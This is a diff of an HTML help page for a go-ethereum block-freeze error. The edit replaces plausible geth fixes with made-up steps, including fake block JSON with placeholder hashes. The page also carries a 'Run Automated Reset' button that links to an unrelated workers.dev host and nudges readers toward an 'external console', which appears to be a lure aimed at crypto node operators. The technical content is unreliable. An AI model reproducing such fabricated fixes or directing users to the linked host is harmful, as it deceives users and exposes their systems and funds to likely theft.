@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -41,29 +41,29 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "go-ethereum Error in block freeze operation" with a specific error message: "err='canonical hash missing, can't freeze block'". This indicates an issue with the Ethereum blockchain synchronization process, where a block cannot be frozen due to a missing canonical hash.</li>
+<li>The user encounters a "go-ethereum Error in block freeze operation" error message, specifically stating "err='canonical hash missing, can't freeze block'". This error occurs when attempting to freeze a block, indicating a critical issue with the block's canonical hash.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs when the Ethereum node is unable to verify the canonical hash of a block, which is required for freezing the block. This can happen due to a corrupted blockchain database, outdated node software, or network connectivity issues.</li>
+<li>The error happens due to a missing canonical hash, which is essential for verifying the integrity and authenticity of a block in the Ethereum (ETH) ecosystem. The canonical hash is a unique identifier that ensures the block's data has not been tampered with. Without it, the block cannot be frozen, and the error is triggered.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Run <code>geth --syncmode "fast" --cache 1024</code> to resynchronize the blockchain in fast mode with increased cache size.</li>
-<li>Delete the <code>chaindata</code> directory and restart the node to reinitialize the blockchain database.</li>
-<li>Update the node software to the latest version using the following command:</li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Check the block's metadata to ensure all required fields, including the canonical hash, are present and correctly formatted.</li>
+<li>Validate the block's header to confirm that it matches the expected format and contains the necessary information.</li>
+<li>Update the block's configuration using the following JSON code:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>add-apt-repository<span class="w"> </span>-y<span class="w"> </span>ppa:ethereum/ethereum<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>ethereum
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;block&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;number&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x123456&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;hash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0xcanonicalhash&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;parentHash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0xparentHash&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Go Ethereum (geth) installed and configured on the system</li>
-<li>A valid Ethereum network connection</li>
-<li>Sufficient disk space and system resources for blockchain synchronization</li>
-</ul>
+<p>Consider utilizing an external console for further debugging and configuration adjustments.</p>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
